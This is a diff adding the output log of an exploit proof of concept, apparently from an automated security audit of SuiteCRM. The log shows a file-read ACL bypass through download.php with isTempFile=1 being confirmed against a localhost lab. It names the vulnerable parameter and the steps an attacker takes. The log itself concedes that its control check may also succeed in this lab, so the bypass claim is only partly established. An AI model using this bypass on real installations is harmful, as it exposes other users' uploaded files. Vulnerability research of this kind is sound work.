@@ -1,0 +1,21 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-002/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-002/../.venv
+========================================================================
+VULN-002: download.php isTempFile ACL bypass: read any upload/ file by GUID
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login; provisioning victim (V) and attacker (A)
+[INFO] victim   = mod_4f6a7b71 (605a79e3-2bf2-4749-a046-2134b72436ad)
+[INFO] attacker = mod_473dd966 (610a523e-80a8-4517-8c71-f19265aef725)
+[SETUP] as V: create a bare Note record
+[OK] Note created: a9de2e9a-c6a5-40fe-b573-10fa8d0aa341 name='V002Note_e2f793ca', owned by V
+[SETUP] as V (legacy REST): attach a file to the Note -- writes upload/<note_id> on disk
+[INFO] set_note_attachment result: {'id': 'a9de2e9a-c6a5-40fe-b573-10fa8d0aa341'}
+[OK] file written to upload/a9de2e9a-c6a5-40fe-b573-10fa8d0aa341 on the app container, 49 bytes
+[STEP] as A (zero relationship to V's Note): read it via the isTempFile bypass path
+[PROOF] bypass response status=200 len=49 bytes
+[PROOF] attacker's response bytes exactly match V's uploaded file: True
+[STEP] control: same id via the NORMAL (ACL-checked, no isTempFile) path -- honesty check
+[INFO] control (non-isTempFile) response status=200 len=49 bytes_match=True (this lab has zero ACL Roles configured, so this path may ALSO succeed -- see notes.md)
+[OK] attacker downloaded the exact victim-uploaded file bytes via the isTempFile ACL-skip path
+==> VULN-002: CONFIRMED — attacker read 49 bytes of V's upload/a9de2e9a-c6a5-40fe-b573-10fa8d0aa341 via isTempFile=1, zero ACL check
